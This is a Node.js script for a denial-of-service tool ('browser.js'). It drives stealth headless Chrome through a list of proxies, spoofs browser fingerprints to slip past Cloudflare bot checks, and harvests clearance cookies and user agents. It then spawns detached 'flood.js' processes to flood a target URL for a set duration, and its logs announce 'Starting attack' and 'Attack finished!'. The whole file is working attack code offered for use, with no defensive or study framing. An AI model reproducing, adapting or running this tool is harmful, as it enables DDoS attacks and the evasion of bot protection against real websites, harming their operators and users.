const fs = require("fs");
const puppeteerCore = require("puppeteer-core");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const { exec, spawn } = require("child_process");

// Auto-detect Chrome executable
function findChrome() {
    const possiblePaths = [
        '/usr/bin/google-chrome-stable',
        '/usr/bin/google-chrome',
        '/usr/bin/chromium-browser',
        '/usr/bin/chromium',
        '/usr/bin/chrome',
        '/usr/local/bin/chromium',
        '/usr/local/bin/chrome',
        process.env.CHROME_PATH,
        process.env.PUPPETEER_EXECUTABLE_PATH
    ].filter(Boolean);
    
    for (const path of possiblePaths) {
        try {
            if (fs.existsSync(path)) {
                return path;
            }
        } catch(e) {}
    }
    return null;
}

// Try to find Chrome, if not found try to use puppeteer-core's bundled info
let chromePath = findChrome();

if (!chromePath) {
    console.error('Chrome/Chromium not found! Trying alternative methods...');
    // Try to find in common installation directories
    const commonDirs = [
        '/opt/google/chrome/chrome',
        '/opt/chromium/chromium',
        '/snap/bin/chromium'
    ];
    
    for (const dir of commonDirs) {
        try {
            if (fs.existsSync(dir)) {
                chromePath = dir;
                break;
            }
        } catch(e) {}
    }
}

if (!chromePath) {
    console.error('\x1b[31m%s\x1b[0m', 'ERROR: Chrome/Chromium not found!');
    console.error('\x1b[33m%s\x1b[0m', 'Please install Chrome/Chromium using one of these commands:');
    console.error('\x1b[36m%s\x1b[0m', '  Debian/Ubuntu: apt-get install -y chromium');
    console.error('\x1b[36m%s\x1b[0m', '  Or download Chrome: npx puppeteer browsers install chrome');
    console.error('\x1b[36m%s\x1b[0m', '  Or set environment variable: export PUPPETEER_EXECUTABLE_PATH=/path/to/chrome');
    process.exit(1);
}

console.log(`\x1b[32m✓\x1b[0m Using Chrome at: ${chromePath}`);

// Use stealth plugin
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

const COOKIES_MAX_RETRIES = 1;

// Colors for logging
const c = {
  reset: "\x1b[0m",
  bright: "\x1b[1m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  pink: "\x1b[35m",
  cyan: "\x1b[36m",
  white: "\x1b[37m",
};

const PREFIX = `$${c.bright}$${c.cyan}[m85|Browser]$${c.reset} `;

const symbols = {
  info: "ℒ",
  success: "✓",
  warn: "!",
  error: "χ",
  proxy: "ℒ",
};

function log(type, text) {
  const symbol = symbols[type] || " ";
  let color = c.white;

  if (type === "error") color = c.red;
  if (type === "success") color = c.green;
  if (type === "warn") color = c.yellow;
  if (type === "info" || type === "proxy") color = c.cyan;
  if (type === "pink") color = c.pink;

  console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
}

const errorHandler = (error) => log("error", error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function (item) {
  const index = this.indexOf(item);
  if (index !== -1) {
    this.splice(index, 1);
  }
  return item;
};

async function spoofFingerprint(page) {
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(window, "screen", {
      value: {
        width: 1920,
        height: 1080,
        availWidth: 1920,
        availHeight: 1080,
        colorDepth: 64,
        pixelDepth: 64,
      },
    });
    Object.defineProperty(navigator, "userAgent", {
      value:
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    });
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    if (gl) {
      const originalGetParameter = gl.getParameter;
      gl.getParameter = function (parameter) {
        if (parameter === gl.VENDOR) return "WebKit";
        if (parameter === gl.RENDERER) return "Apple GPU";
        return originalGetParameter(parameter);
      };
    }
    Object.defineProperty(navigator, "plugins", {
      value: [{ name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format", length: 1 }],
    });
    Object.defineProperty(navigator, "languages", { value: ["en-US", "en"] });
    Object.defineProperty(navigator, "webdriver", { get: () => false });
    Object.defineProperty(navigator, "hardwareConcurrency", { value: 4 });
    Object.defineProperty(navigator, "deviceMemory", { value: 8 });
    Object.defineProperty(document, "cookie", {
      configurable: true,
      enumerable: true,
      get: () => "",
      set: () => {},
    });
    Object.defineProperty(navigator, "cookiesEnabled", {
      configurable: true,
      enumerable: true,
      get: () => true,
      set: () => {},
    });
    Object.defineProperty(window, "localStorage", {
      configurable: true,
      enumerable: true,
      value: {
        getItem: () => null,
        setItem: () => {},
        removeItem: () => {},
      },
    });
    Object.defineProperty(navigator, "doNotTrack", { value: null });
    Object.defineProperty(navigator, "maxTouchPoints", { value: 10 });
    Object.defineProperty(navigator, "language", { value: "en-US" });
    Object.defineProperty(navigator, "vendorSub", { value: "" });
  });
}

if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <target> <threads> <proxies.txt> <rate> <time>");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3], 10);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6], 10);

const sleep = (duration) => new Promise((resolve) => setTimeout(resolve, duration * 1000));

const readProxiesFromFile = (filePath) => {
  try {
    const data = fs.readFileSync(filePath, "utf8");
    const proxies = data.trim().split(/\r?\n/);
    return proxies.filter(p => p && p.trim());
  } catch (error) {
    log("error", `Error reading proxies file: ${error.message}`);
    return [];
  }
};

const proxies = readProxiesFromFile(proxyFile);

if (proxies.length === 0) {
  log("error", "No proxies found in file!");
  process.exit(1);
}

log("info", `Loaded ${proxies.length} proxies`);

const userAgents = () => {
  const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
  const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
  const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
  const operatingSystems = [
    "Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX",
  ];
  const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
  const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
  const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
  const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
  const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);

  const macbookUA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";

  if (Math.random() < 0.3) {
    return macbookUA;
  }

  return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} (${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} (KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
};

async function detectChallenge(page, browserProxy) {
  try {
    const content = await page.content();
    if (content.includes("challenge-platform") || content.includes("cf-challenge")) {
      log("pink", `Challenge detected for proxy: ${browserProxy}`);
      await sleep(5);
      return true;
    }
    return false;
  } catch (error) {
    return false;
  }
}

async function openBrowser(targetURL, browserProxy) {
  const userAgent = userAgents();
  const options = {
    headless: "new",
    ignoreHTTPSErrors: true,
    executablePath: chromePath,
    args: [
      `--proxy-server=http://${browserProxy}`,
      "--no-sandbox",
      "--no-first-run",
      "--ignore-certificate-errors",
      "--disable-extensions",
      "--test-type",
      `--user-agent=${userAgent}`,
      "--disable-gpu",
      "--disable-browser-side-navigation",
      "--disable-dev-shm-usage",
      "--disable-setuid-sandbox",
      "--disable-accelerated-2d-canvas",
      "--disable-gpu-sandbox",
    ],
  };
  
  let browser;
  try {
    browser = await puppeteer.launch(options);
    const page = await browser.newPage();
    
    await spoofFingerprint(page);
    page.setDefaultNavigationTimeout(30000);
    page.setDefaultTimeout(30000);
    
    await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 30000 });
    
    const hasChallenge = await detectChallenge(page, browserProxy);
    if (hasChallenge) {
      await sleep(3);
    }
    
    const title = await page.title();
    const cookies = await page.cookies(targetURL);
    const cookieString = cookies.map((cookie) => cookie.name + "=" + cookie.value).join("; ");
    
    log("success", `[${browserProxy}] Title: ${title}`);
    
    return {
      browser,
      title,
      browserProxy,
      cookies: cookieString,
      userAgent,
      page
    };
  } catch (error) {
    log("error", `Error in openBrowser (${browserProxy}): ${error.message}`);
    if (browser) await browser.close();
    return null;
  }
}

async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  if (retries >= COOKIES_MAX_RETRIES) {
    const currentTask = queue.length();
    done(null, { task, currentTask });
    return;
  }
  
  let browser = null;
  try {
    const response = await openBrowser(targetURL, browserProxy);
    if (!response) {
      throw new Error("Failed to open browser or retrieve response");
    }
    
    browser = response.browser;
    
    if (response.title === "Just a moment..." || response.title === "Attention Required! | Cloudflare") {
      log("error", `Proxy blocked: ${response.browserProxy} - ${response.title}`);
      if (browser) await browser.close();
      done(null, { task, currentTask: queue.length() });
      return;
    }
    
    const cookiesData = response.cookies;
    const userAgent = response.userAgent;
    
    log("info", `Launching flood with proxy: ${response.browserProxy}`);
    
    // Spawn flood process
    const floodProcess = spawn("node", [
      "flood.js",
      targetURL,
      "100",
      "2",
      response.browserProxy,
      rates,
      cookiesData,
      userAgent,
    ], { 
      detached: true, 
      stdio: 'ignore',
      env: process.env
    });
    
    floodProcess.unref();
    
    if (browser) await browser.close();
    done(null, { task, currentTask: queue.length() });
    
  } catch (error) {
    log("error", `Error in startThread: ${error.message}`);
    if (browser) await browser.close();
    await startThread(targetURL, browserProxy, task, done, retries + 1);
  }
}

const queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
  log("info", `Starting attack on ${targetURL}`);
  log("info", `Threads: ${threads}, Duration: ${duration}s, Rate: ${rates}`);
  log("info", `Proxies loaded: ${proxies.length}`);
  
  for (const browserProxy of proxies) {
    queue.push({ browserProxy });
  }
  
  // Run for specified duration
  await sleep(duration);
  
  log("warn", "Time's up! Killing all processes...");
  queue.kill();
  
  // Kill flood.js processes
  exec("pkill -f flood.js", (err) => {
    if (err && err.code !== 1) log("error", `Error killing flood.js: ${err.message}`);
  });
  
  // Kill chrome processes
  exec("pkill -f chrome", (err) => {
    if (err && err.code !== 1) log("error", `Error killing chrome: ${err.message}`);
  });
  
  log("success", "Attack finished!");
  process.exit(0);
}

// Handle graceful shutdown
process.on('SIGINT', () => {
  log("warn", "Received SIGINT. Shutting down...");
  queue.kill();
  exec("pkill -f flood.js");
  exec("pkill -f chrome");
  process.exit(0);
});

main();
